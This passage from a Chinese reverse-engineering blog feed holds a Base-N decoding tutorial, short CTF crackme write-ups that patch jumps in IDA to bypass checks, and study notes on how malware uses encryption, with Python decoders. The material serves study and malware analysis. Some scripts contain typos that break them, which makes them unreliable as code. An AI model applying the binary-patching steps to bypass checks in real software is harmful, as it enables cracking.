HIDWORD(v14)) &gt;&gt; 10) &amp; 0x1F];</span><br><span class="line">        LOBYTE(v16) = __PAIR__(v17, HIDWORD(v14)) &gt;&gt; 5;</span><br><span class="line">        v3 = v25;</span><br><span class="line">        v24[6] = byte_403020[v16 &amp; 0x1F];</span><br><span class="line">        LOBYTE(v16) = byte_403020[BYTE4(v14) &amp; 0x1F];</span><br><span class="line">        v2 = v32;</span><br><span class="line">        v24[7] = v16;</span><br><span class="line">        v24 += 8;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v8 &lt; v25 );</span><br><span class="line">      result = v28;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v22 &gt; 0 )</span><br><span class="line">      memset(&amp;result[v26], 61u, v22);</span><br><span class="line">    *(&amp;v28[v26] + v22) = 0;</span><br><span class="line">    result = v28;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心算法提取出来了，我们看到了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LODWORD(v16) = (((v23 &amp; 0xFFFFFFF8) &lt;&lt; 8) + (v18 &amp; 0xFFFFFFC0 | ((v23 &amp; 7) &lt;&lt; 8)) + (v18 &amp; 0x3E)) &lt;&lt; 8;</span><br></pre></td></tr></table></figure></p><p>和<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v24[1] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 30) &amp; 0x1F];</span><br><span class="line">v24[2] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 25) &amp; 0x1F];</span><br><span class="line">v24[3] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 20) &amp; 0x1F];</span><br><span class="line">v24[4] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 15) &amp; 0x1F];</span><br><span class="line">v24[5] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 10) &amp; 0x1F];</span><br></pre></td></tr></table></figure></p><p>每次取5个比特，分别赋给8个值，每个值5个位 ,显然的base32</p><h3 id="3-table"><a href="#3-table" class="headerlink" title="3. table"></a>3. table</h3><p>table一般在核心算法的上一层函数，数据段也有所显现，当然table也许会被加密或者替换，但都是类似异或，转换进制，运算，奇偶位之类的，照着写脚本就好，</p><p>像下图这样就是经过了字母倒序，奇数小写偶数大写，尾部追加得到table</p><p><img src="https://i.loli.net/2018/07/15/5b4b3ffc33cd8.jpg" alt=""></p><h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><p>Python3脚本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s = &quot;密文&quot;</span><br><span class="line">table = &quot;表&quot;</span><br><span class="line"></span><br><span class="line">def find(x):</span><br><span class="line">    if(x==&apos;=&apos;):</span><br><span class="line">        return 0</span><br><span class="line">    return table.index(x)</span><br><span class="line"></span><br><span class="line">for i in range(len(s)//8):</span><br><span class="line">    p = s[i*8:i*8+8]</span><br><span class="line">    t = 0</span><br><span class="line">    for j in p:</span><br><span class="line">        t = t&lt;&lt;5</span><br><span class="line">        t += find(j)</span><br><span class="line">    for j in range(5):</span><br><span class="line">        print(chr((t&amp;0xff00000000)&gt;&gt;32), end=&apos;&apos;)</span><br><span class="line">        t = t&lt;&lt;8</span><br></pre></td></tr></table></figure></p><h2 id="魔改Base"><a href="#魔改Base" class="headerlink" title="魔改Base"></a><strong>魔改Base</strong></h2><p>经过上面的分析也就可以知道Base中可变的几个部分</p><p>CTF中常见的变化位置有下面几个</p><blockquote><ol><li>table</li></ol></blockquote><p>这个上面提到了。。</p><blockquote><ol><li>移位数据变化</li></ol></blockquote><p>从例子可以看出决定了题中Base-N的N是多少的是移位个数和移位距离<br>只要抓住算法的核心思想就能很快识别出来</p><blockquote><ol><li>组合</li></ol></blockquote><p>很多题都会通过组合加密的方式来提升题目难度，Base中应该就是加密密文和table了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>差不多就是这样了，Base-N相对来说只要熟悉模板就能很快识别了。</p><p>希望自己能坚持下去，分析不同的算法：）</p><p>From <a href="https://kabeor.github.io/Base-N算法及逆向初探/">https://kabeor.github.io/Base-N算法及逆向初探/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Base-N算法及逆向初探&quot;&gt;&lt;a href=&quot;#Base-N算法及逆向初探&quot; class=&quot;headerlink&quot; title=&quot;Base-N算法及逆向初探&quot;&gt;&lt;/a&gt;Base-N算法及逆向初探&lt;/h1&gt;&lt;p&gt;上次研究了&lt;a href=&quot;https://kabe
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第八届swpu网络安全大赛逆向r2 r3</title>
    <link href="https://kabeor.github.io/%E7%AC%AC%E5%85%AB%E5%B1%8Aswpu%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%80%86%E5%90%91r2%20r3/"/>
    <id>https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/</id>
    <published>2018-09-04T02:31:49.195Z</published>
    <updated>2018-09-04T03:07:48.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第八届swpu网络安全大赛逆向r2-r3"><a href="#第八届swpu网络安全大赛逆向r2-r3" class="headerlink" title="第八届swpu网络安全大赛逆向r2 r3"></a>第八届swpu网络安全大赛逆向r2 r3</h1><p>也是以前的题了</p><h2 id="R2：bin100"><a href="#R2：bin100" class="headerlink" title="R2：bin100"></a>R2：bin100</h2><p>打开程序<br><img src="https://i.loli.net/2018/09/04/5b8deefecd76d.jpg" alt=""></p><p>。。。。。什么也没有<br>尝试输入，输到16位后提醒重试<br>用OD打开</p><p>界面像是输序列号，正好在看雪论坛看到以下内容</p><p><img src="https://i.loli.net/2018/09/04/5b8def1d19c71.jpg" alt=""></p><p>于是查找windowtextA</p><p><img src="https://i.loli.net/2018/09/04/5b8def2d25c46.jpg" alt=""><br><img src="https://i.loli.net/2018/09/04/5b8def34d0fae.jpg" alt=""></p><p>一直F8，看到cmp，应该是判断输入是否满足16位<br>打开IDA ，F5看伪代码</p><p><img src="https://i.loli.net/2018/09/04/5b8def45a9635.jpg" alt=""></p><p>然后接下来应记下关键跳转的地址，在IDA中分析，<br>输入的数字经过一系列计算，最后与一个字符串对比<br>得出flag</p><h2 id="R3：bin200"><a href="#R3：bin200" class="headerlink" title="R3：bin200"></a>R3：bin200</h2><p>先查壳</p><p><img src="https://i.loli.net/2018/09/04/5b8defbc9e8a2.jpg" alt=""></p><p>VC++写的<br>先用IDA调试：<br>查找字符串，发现一串数字08067<br>跟随后F5</p><p><img src="https://i.loli.net/2018/09/04/5b8defccf0ede.jpg" alt=""></p><p>可以看到result=8，应该是要对比已通关数和总关数8<br>然后跟着往下发现对比的if语句，找到相等时的跳转的地址，在OD上找到这个地址，就可以找出flag</p><p>From <a href="https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/">https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第八届swpu网络安全大赛逆向r2-r3&quot;&gt;&lt;a href=&quot;#第八届swpu网络安全大赛逆向r2-r3&quot; class=&quot;headerlink&quot; title=&quot;第八届swpu网络安全大赛逆向r2 r3&quot;&gt;&lt;/a&gt;第八届swpu网络安全大赛逆向r2 r3&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ebCTF2013 RE</title>
    <link href="https://kabeor.github.io/ebCTF2013%20RE/"/>
    <id>https://kabeor.github.io/ebCTF2013 RE/</id>
    <published>2018-09-04T02:22:39.277Z</published>
    <updated>2018-09-04T03:07:48.988Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ebCTF2013-RE"><a href="#ebCTF2013-RE" class="headerlink" title="ebCTF2013 RE"></a>ebCTF2013 RE</h2><p>今天在看以前的笔记时看到了这篇，觉得有意思，就放上来了</p><p>放入IDA中分析，先看下流程：</p><p><img src="https://i.loli.net/2018/09/04/5b8decf7c9753.jpg" alt=""></p><p>找到主函数，空格<br>可以看到具体的一些步骤和相互之间的关系</p><p><img src="https://i.loli.net/2018/09/04/5b8ded2313e2b.jpg" alt=""><br><img src="https://i.loli.net/2018/09/04/5b8ded2c4d7b8.jpg" alt=""></p><p>大体就是这样<br>点击view-&gt;open subviews-&gt;strings  可以看到分析出的字符串</p><p><img src="https://i.loli.net/2018/09/04/5b8ded509b665.jpg" alt=""></p><p>这就是程序运行时的流程，可以看出，我们需要投掷3-1-3-3-7，这几乎是不可能的，所以我们需要改动跳转的判断条件。</p><p>F5键可以打开插件HexRays 查看伪代码</p><p><img src="https://i.loli.net/2018/09/04/5b8ded60a561a.jpg" alt=""></p><p>可以看出这里的判断条件<br>于是结合流程图我们可以看出，应该修改的是每一部分最后一个跳转，此语句本来是jnz跳转，我们只需把它修改成jz即可</p><p>通过edit-&gt;patch program-&gt;change byte 修改机器码，把原来开头的75改为74即可</p><p>最后运行一下发现每次成功后flag都会一闪而过</p><p>于是我们应该把最后的跳转到retn的jmp给nop掉<br>大功告成</p><p><img src="https://i.loli.net/2018/09/04/5b8dede193bfb.jpg" alt=""></p><p>From <a href="https://kabeor.github.io/ebCTF2013 RE/">https://kabeor.github.io/ebCTF2013 RE/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ebCTF2013-RE&quot;&gt;&lt;a href=&quot;#ebCTF2013-RE&quot; class=&quot;headerlink&quot; title=&quot;ebCTF2013 RE&quot;&gt;&lt;/a&gt;ebCTF2013 RE&lt;/h2&gt;&lt;p&gt;今天在看以前的笔记时看到了这篇，觉得有意思，就放上来了&lt;/p
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第13章  数据加密</title>
    <link href="https://kabeor.github.io/%E7%AC%AC13%E7%AB%A0%20%20%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"/>
    <id>https://kabeor.github.io/第13章  数据加密/</id>
    <published>2018-08-31T07:33:12.166Z</published>
    <updated>2018-09-02T12:37:09.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第13章-数据加密"><a href="#第13章-数据加密" class="headerlink" title="第13章  数据加密"></a>第13章  数据加密</h1><h2 id="13x1-分析加密算法的目的"><a href="#13x1-分析加密算法的目的" class="headerlink" title="13x1 分析加密算法的目的"></a>13x1 分析加密算法的目的</h2><p>恶意代码用加密来达到各种各样的目的。最常见的是加密网络通信，同时，恶意代码也会用加密来隐藏它的内部工作。例如，恶意代码编写者可能因为如下目的而使用加密：</p><blockquote><p>·隐藏配置信息。例如，命令和控制服务器域名。<br>·窃取信息之前将它保存到一个临时文件。<br>·存储需要使用的字符串，并在使用前对其解密。<br>·将恶意代码伪装成一个合法的工具，隐藏恶意代码活动中使用的字符串。</p></blockquote><p>分析加密算法时，我们的目标由两部分组成:识别加密算法，然后根据识别的加密算法解密攻击者的秘密。</p><h2 id="13x2-简单的加密算法"><a href="#13x2-简单的加密算法" class="headerlink" title="13x2 简单的加密算法"></a>13x2 简单的加密算法</h2><h3 id="1-凯撒密码"><a href="#1-凯撒密码" class="headerlink" title="1. 凯撒密码"></a>1. 凯撒密码</h3><h3 id="2-XOR"><a href="#2-XOR" class="headerlink" title="2. XOR"></a>2. XOR</h3><p>XOR加密使用一个静态字节值，通过与该值执行逻辑异或运算来修改明文中的每个字节。</p><blockquote><p>暴力破解XOR加密</p></blockquote><p>由于文件中的每个字符只有256种可能的值，对于一个计算机来说很容易并且能够足够快地使用255个单字节密钥来异或文件头部，然后将输出与期望的可执行文件头部进行比较。可以使用一个脚本来执行用255个密钥的XOR加密。</p><blockquote><p>保留NULL的单字节XOR加密</p></blockquote><p>单字节加密的一个漏洞：它对使用十六进制编辑器手动扫描加密内容的用户缺乏有效的隐蔽性。如果加密内容中有大量的NULL字节，那么单字节密钥变得十分明显。</p><p>与标准的XOR加密策略不同，保留NULL的单字节XOR加密策略有两个例外。</p><ol><li>如果明文中字符是NULL或者密钥本身，则被跳过。</li><li>如果明文中字符既不是NULL也不是密码本身，则将被使用XOR密钥加密。</li></ol><p><img src="https://i.loli.net/2018/08/31/5b88f4d7dc022.jpg" alt=""></p><h4 id="用IDA-Pro识别XOR循环"><a href="#用IDA-Pro识别XOR循环" class="headerlink" title="用IDA Pro识别XOR循环"></a>用IDA Pro识别XOR循环</h4><p>在反汇编中，通过循环语句中间使用XOR指令的小循环语句找到了XOR循环。用IDA Pro找到XOR循环的一个最简单方法是搜索指令中XOR指令，如下：<br>1.确保你正在查看代码（窗口的标题应该包含“IDAView”）。<br>2.选择Search→Text。<br>3.在文本搜索对话框中输入xor，选中Find all occurrences复选框，然后单击OK按钮。</p><p>搜索到XOR指令并不意味着它一定用于加密。XOR指令可以用于不同的目的，其用途之一就是清空寄存器的内容。XOR指令以三种形式存在。</p><ol><li>用寄存器自身XOR。</li><li>用一个常量（或一个内存引用）XOR。</li><li>使用一个不同寄存器（或一个内存引用）XOR。</li></ol><p>最常见的是第一种形式，因为寄存器与自身异或是清零寄存器的一种有效方式。幸运的是，清零寄存器与数据加密无关，所以可以忽略它。</p><p>XOR加密循环可能使用另外两种形式中的一种：用一个常量异或一个寄存器，或者用一个不同的寄存器异或一个寄存器。如果你幸运，XOR加密是一个常量异或寄存器的XOR，因为通过它，可以确认你可能发现了加密，并且也可以知道密钥。</p><p>加密的迹象之一就是含有一个包含XOR函数的嵌套循环。</p><h3 id="3-其他一些简单的加密策略"><a href="#3-其他一些简单的加密策略" class="headerlink" title="3. 其他一些简单的加密策略"></a>3. 其他一些简单的加密策略</h3><p><img src="https://i.loli.net/2018/08/31/5b88f66b1a17f.jpg" alt=""></p><h3 id="4-Base64"><a href="#4-Base64" class="headerlink" title="4. Base64"></a>4. Base64</h3><p>术语Base64来自于多用途Internet邮件扩展（MIME）标准。虽然Base64最初用于加密传输的邮件附件，但是现在它却广泛用于HTTP和XML。</p><p>Base64编码将二进制数据转换成64个字符的有限字符集。对于不同类型的Base64加密，有多种不同的策略或字母表。但是它们都使用64个主要的字符，另外，它们通常用一个额外字符表示填充，通常是“=”。</p><p>最常用的字符集是MIME Base64，它使用A~Z、a~z和0~9作为前62个值，+和/作为最后两个值。由于需要将数据压缩成一个较小字符集，给Base64加密后的数据会比原始的数据长。对于3个字节的二进制文件，加密后是至少4个字节的Base64加密数据。</p><blockquote><p>数据转化成Base64</p></blockquote><p>原始数据转换成Base64的过程相当标准。它使用24位（3个字节）的块。第一个字符被放到最重要的位置，第二个字符放在中间的8位，第三个字符放在最不重要的后8位。接下来，从最重要位置的开始，位被读入到6个块中。</p><p><img src="https://i.loli.net/2018/08/31/5b88f7ca698a5.jpg" alt=""></p><p>上图展示转换发生的过程，最上面一行是原始的字符串（ATT）。第二行是ATT的半字节表示（半字节等于4位）。中间一行用来表示ATT的实际位。第四行以6位段十进制表示位值。最后，最终的字符串通过十进制索引参考字符串得出字符。</p><p>由上图可见，字母A相应的比特位是01000001。A字母的前6位被转换成Base64加密的单字符Q。字母A的最后两位（01）和字母T前四位（0101）被转化成Base64加密的第二个字符V（010101）。</p><p>将Base64解密成原始的数据遵循相同的过程，但是过程是相反的。首先将每个Base64字符转换成6个比特位，将所有比特位按顺序存放。然后，以八位一组读取比特位，每组8个比特位表示原始数据的字节。</p><blockquote><p>识别和解密Base64</p></blockquote><p>在技术上，填充字符是可选的，并且它们对解密的准确性不是必须的。恶意代码知道避免使用这种填充字符，想必是为了使它们看起来不像Base64编码并避免网络特征。</p><p>因为Base64加密的实现通常使用索引字符串，含有Base64加密的代码经常会存在这个64字符组成的加密字符串。通常情况下，索引Base64的字符串由可打印字符组成（或者它会破坏该算法的意图），因此可以很容易用眼睛察觉字符串输出。</p><p>第二个可以被用来确认使用Base64加密算法的证据是存在一个单独填充字符（常为“=”），这个单独的填充字符常被硬编码到执行加密的函数中。</p><h2 id="13x3-常见的加密算法"><a href="#13x3-常见的加密算法" class="headerlink" title="13x3 常见的加密算法"></a>13x3 常见的加密算法</h2><p>简单的加密算法与现代的加密算法不同，它们等同于替换算法。现代的加密算法考虑了增加指数级的计算能力，并且确保设计的算法需要大量的计算能力，从而使破解它们不切实际。</p><p>先前我们讨论的简单加密策略并不试图对暴力破解方法加以保护，它们的主要目的是隐藏。随着时间的推移，加密算法逐渐改进和发展，并且它们已经深入到计算机应用的各个方面，例如网页浏览器中的SSL，无线接入点使用的加密等等。那么，为什么恶意代码不使用这种加密算法来隐藏敏感信息呢？恶意代码使用简单的加密策略是因为它们容易且足够使用。此外，使用标准的加密存在一些潜在的漏洞，特别是对于恶意代码来说：</p><ol><li>加密库很大，所以恶意代码需要静态的集成或者链接到已有的代码中。</li><li>链接主机上现有的代码可能降低可移植性。</li><li>标准加密库比较容易探测（通过函数导入，函数匹配或者加密常量标识）。</li><li>对称加密算法需要考虑如何隐藏密钥。</li></ol><p>很多标准加密算法都依赖于一个强大的密钥来存储它们的秘密。算法本身是公开的，但是如果没有密钥，几乎不可能（也就说它需要大量工作）破解加密的密文。要确保解密费时费力，通常情况下，密钥必须足够长从而使得测试所有可能的密钥不那么容易。对于恶意代码可能使用的标准加密算法，关键是不仅要识别加密算法，而且还要识别密钥。</p><p>有一些简单方法可以识别标准加密。它们包括查找字符串和引用加密函数的导入，使用一些工具寻找特定的内容。</p><h3 id="1-识别字符串和导入"><a href="#1-识别字符串和导入" class="headerlink" title="1. 识别字符串和导入"></a>1. 识别字符串和导入</h3><p>一种识别标准加密算法的方法是识别涉及加密算法使用的字符串。当加密库（如OpenSSL）被静态地编译到恶意代码时，这种情况便会发生。</p><p>另外一种查找标准加密算法的方法是识别引用导入的加密函数。</p><h3 id="2-查找加密常量"><a href="#2-查找加密常量" class="headerlink" title="2. 查找加密常量"></a>2. 查找加密常量</h3><p>第三种检测加密的基本方法是使用可以搜索常见加密常量的工具，这里，我们使用IDA Pro的FindCrypt2和Krypto ANALyzer插件。</p><blockquote><p>使用FindCrypt2</p></blockquote><p>IDAPro有一个叫做FindCrypt2插件，包含在IDAPro的SDK中，它搜索程序中任何与加密算法相关的已知常量。这样做效果很好，因为多数加密算法会使用一些神秘的常量类型。所谓神秘常量则是与基本加密算法结构相关的一些固定位串。</p><p><strong><em>注意：一些加密算法并不使用神秘常量，值得注意的是，国际数据加密（IDEA）算法和RC4算法动态地创建它们的结构，因此它们不在可识别的算法之中。恶意代码常使用RC4算法，因为它体积小，在软件中易于实现，并且没有明显的加密常量。</em></strong></p><p>与IDAPRO的插件FindCrypt2原理相同的一个工具是Krypto ANALyzer（KANAL）。KANAL是PEiD的一个插件，它拥有一个范围更广的常量集合（作为结果可能更加容易产生误报）。除此之外，KANAL还能够识别Base64编码表以及加密相关的导入函数。</p><h3 id="3-查找高熵值内容"><a href="#3-查找高熵值内容" class="headerlink" title="3. 查找高熵值内容"></a>3. 查找高熵值内容</h3><p>识别加密算法的另一方法是查找高熵值的内容。除了识别潜在的明显的加密常量或者加密密钥外，这种技术也可以识别加密内容本身。由于这种技术的影响广泛，可以适用于没有找到加密常量的地方（如RC4）。</p><p><strong><em>警告：高嫡内容技术相当迟钝，最好作为最后一种使用手段。多种类型的内容，如图片、电影、音频文件以及其他压缩数据等，也会显示高篇值，除了它们的头部特征之外，很难与加密内容进行区分。</em></strong></p><p>IDA的熵值插件(<a href="http://www.smokedchicken.org/2010/06/idaentropy-plugin.html" target="_blank" rel="noopener">http://www.smokedchicken.org/2010/06/idaentropy-plugin.html</a> )是针对PE文件使用这种技术的一个工具。将ida-entplw文件放置到IDAPro的插件目录，就可以将这个插件载入到IDA Pro。</p><p>包含64个不同字节值的64字节字符串拥有最高可能的熵值，这64个值与熵值6相关（指6比特位的熵），因为6比特位表示的数字是64。</p><p>另外一种可能有用的设置是大小为256的块，其熵值大于7.9。这也意味一个256个连续字节的字符串几乎反应出所有256个可能的字节值。</p><p>IDAPro的熵值插件还有一个提供图形化概览感兴趣区域的工具，可以用它来引导你选择最大熵评分值，同时也帮助你确定关注范围。绘图按钮产生一个图，它将高熵值区域显示为亮条，将低熵值区域显示为暗条。在图上移动鼠标光标，可以看到图中某些点的原始熵值。因为熵的地图在打印格式下很难准确表达。</p><h2 id="13x4-自定义加密"><a href="#13x4-自定义加密" class="headerlink" title="13x4 自定义加密"></a>13x4 自定义加密</h2><p>恶意代码常使用自创的加密方案，一种方案是将多个简单加密方法组装到一起。例如，恶意代码可以先执行一次XOR加密，然后在XOR加密基础上执行Base64加密。另外一种方案就是开发一种与标准加密算法相似的自定义加密算法。</p><h3 id="1-识别自定义加密"><a href="#1-识别自定义加密" class="headerlink" title="1. 识别自定义加密"></a>1. 识别自定义加密</h3><p>发现加密算法的艰难历程是从可疑的输入或者输出开始跟踪运行的线程。输入和输出是一个通用分类，无论恶意代码是发送网络数据包，写入文件或者写入标准输出，这都是输出。如果怀疑输出中包含加密数据，那么加密函数应该出现在输出之前。</p><p>相反，解密则出现在输入之后。例如，假设你确认了一个输入函数，则你首先应该识别出跟输入有关的数据元素，然后向后跟踪执行路径，找到访问相关数据元素的新函数。如果你到达一个函数的末尾，你应该在调用函数发生的地方继续，并且再次注意数据的位置。多数情况下，加密函数离输入函数不远。除了反向跟踪执行路径外，输出函数也是类似的。</p><h3 id="2-攻击者使用自定义加密的优势"><a href="#2-攻击者使用自定义加密的优势" class="headerlink" title="2. 攻击者使用自定义加密的优势"></a>2. 攻击者使用自定义加密的优势</h3><p>对于攻击者，自定义加密方法拥有它自身的优势，主要是因为它们保留了简单加密策略的特点（体积小和加密不明显），同时使逆向工作变得十分困难。逆向这种类型的加密（也就是识别加密过程并且开发解密器）比标准加密方法是否更加困难存在一些争议。</p><p>对于多种标准加密来说，如果识别了加密算法并且发现了密钥，则很容易使用标准的函数库来编写解密器。对于自定义加密，攻击者可以根据自己的需要创建任意的加密方案，它们可能使用也可能不使用一个明显的密钥。正如前面的例子中介绍的，密钥嵌入到代码中，甚至攻击者使用了一个密钥并且被我们发现，但是，不可能存在一个免费的函数库供我们实现解密。</p><h2 id="13x5-解密"><a href="#13x5-解密" class="headerlink" title="13x5 解密"></a>13x5 解密</h2><p>重现恶意代码中的加密或解密函数的两种基本方法</p><ol><li>重新编写函数</li><li>使用恶意代码中存在的函数</li></ol><h3 id="1-自解密"><a href="#1-自解密" class="headerlink" title="1. 自解密"></a>1. 自解密</h3><p>最经济的解密方法是:无论算法是否已知,让程序正常活动期间自己完成解密。我们称这种方法为自解密。如果你在调试器中暂停了恶意程序,并且注意到内存中的一个字符串,在你运行字符函数时你没有看到它,那么你已经使用自解密技术。无论先前被隐藏的信息在何处被解密,中断解密过程并做进一步分析,比尝试着确定使用了何种加密机制和尝试构造解密器更加容易虽然自解密是一种廉价且有效的解密方式,但是它也有缺点。首先,为了确认执行的每一个解密实例,你都必须要分离解密函数,并且在解密例程之后直接设置断点。更重要的是,如果恶意代码没有解密你感兴趣的信息(或你不知道如何欺骗恶意代码让其这么做),那你就会很倒霉。由于这些原因,使用这种技术的关键是提供更多控制。</p><h3 id="2-手动执行解密函数"><a href="#2-手动执行解密函数" class="headerlink" title="2. 手动执行解密函数"></a>2. 手动执行解密函数</h3><p>对于简单的加密和编码方法，通常你可以使用编程语言提供的标准函数。</p><p>对于缺少标准解密函数的简单加密方法，如XOR加密或使用修改字母表的的Base64加密，最简单的方法是使用你选择语言中的程序或脚本的加密函数。</p><p><strong>Base64脚本</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">example_string=&apos; VChpcyBpcyBhIHR1c3Qgc3RyawSn&apos;</span><br><span class="line">print base64. decodestring(example_string)</span><br></pre></td></tr></table></figure></p><p><strong>保留NULL字节的XOR加密算法的Python脚本</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def null_preserving_xor(input_char,key_char):</span><br><span class="line">    if(input_char s= key_char or input_char == chr(0x00)): </span><br><span class="line">        return input_char </span><br><span class="line">else: </span><br><span class="line">        return chr(ord(input_char)^ord(key_char))</span><br></pre></td></tr></table></figure></p><p>这个函数需要两个字符：一个输入字符，一个密钥字符，并且输出一个转换后的字符。为了使用保留NULL的单字节XOR加密算法来转换一个字符串或者一个更长的内容，将它们的每一个输入字符和一个相同密钥一起传给这个子例程（函数）。</p><p><strong>自定义Base64编码的脚本</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s = &quot;&quot;</span><br><span class="line">custom=&quot;9ZABCDEFGHIJKLMNOPQRSTUVWXYabcdefghijklmnopqrstuvwxyz012345678+/&quot;</span><br><span class="line">Base64=&quot;ABCDEFCHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line"></span><br><span class="line">ciphertext=&apos;TEgobxZobxZgCFPkb20&apos;</span><br><span class="line"></span><br><span class="line">for ch in ciphertext: </span><br><span class="line">    if(ch in Base64): </span><br><span class="line">    s = s + Base64[string.find(custom, str(ch))]</span><br><span class="line">    elif(ch == &apos;=&apos;):</span><br><span class="line">        s += &apos;=&apos;</span><br><span class="line">result = base64.decodestring(s)</span><br></pre></td></tr></table></figure></p><p>对于标准的加密算法，最好是使用代码库中提供的现有实现。一个基于Python的加密库叫做PyCrypto（hup://www.dlitz.net/software/pycrypto/ ），它提供了各种各样的加密函数。类似的库也存在于其他不同的语言中</p><p><strong>DES脚本</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import DES </span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">obj = DES.new(&quot;password&quot;, DES. MODE_ECB)</span><br><span class="line">cfile=open(&apos;encrypted_file&apos;,&apos;r&apos;)</span><br><span class="line">cbuf=f.read()</span><br><span class="line">print obj.decrypt(cbuf)</span><br></pre></td></tr></table></figure></p><p>利用导入的PyCrypto库，脚本打开一个名为encrypted_file的加密文件，并且使用密码pas sword，用电子密码本（ECB）模式进行了DES破解。</p><p>分组加密与DES加密类似，它使用不同的加密模式将一个单密钥应用到任意长度的明文流中，并且在库调用时指定模式。最简单的模式是ECB，它将分组密码应用到每个单独的明文块上。</p><p>脚本加密算法有多种可用的变种。前面的例子为编写自己的解密器提供了一个有效的选项类型。</p><p>攻击者编写自己版本的加密算法，通常要保留加密算法的简单性与良好的定义（以标准加密算法为例）。在处理非常复杂而且不标准的加密算法时，由于很难模拟算法，因此会成为更艰巨的挑战。</p><h3 id="3-使用通用的解密规范"><a href="#3-使用通用的解密规范" class="headerlink" title="3. 使用通用的解密规范"></a>3. 使用通用的解密规范</h3><p>在自解密中，试图让恶意代码自己解密时，你应该让恶意代码以正常方式运行，并且让其在合适的时间停止。但是，当你能够控制它的时候便没有了让其按照正常方式运行的理由。</p><p>一旦分离了加密或者解密例程，并且知道了它们的参数，则完全有可能使用规范让恶意代码解密任意内容，因此应该有效利用恶意代码本身来对付恶意代码。</p><p>From <a href="https://kabeor.github.io/第13章  数据加密/">https://kabeor.github.io/第13章  数据加密/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第13章-数据加密&quot;&gt;&lt;a href=&quot;#第13章-数据加密&quot; class=&quot;headerlink&quot; title=&quot;第13章  数据加密&quot;&gt;&lt;/a&gt;第13章  数据加密&lt;/h1&gt;&lt;h2 id=&quot;13x1-分析加密算法的目的&quot;&gt;&lt;a href=&quot;#13x1-分析加密
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第四篇 恶意代码功能篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第12章  隐蔽的恶意代码启动</title>
    <link href="https://kabeor.github.io/%E7%AC%AC12%E7%AB%A0%20%20%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/"/>
    <id>https://kabeor.github.io/第12章  隐蔽的恶意代码启动/</id>
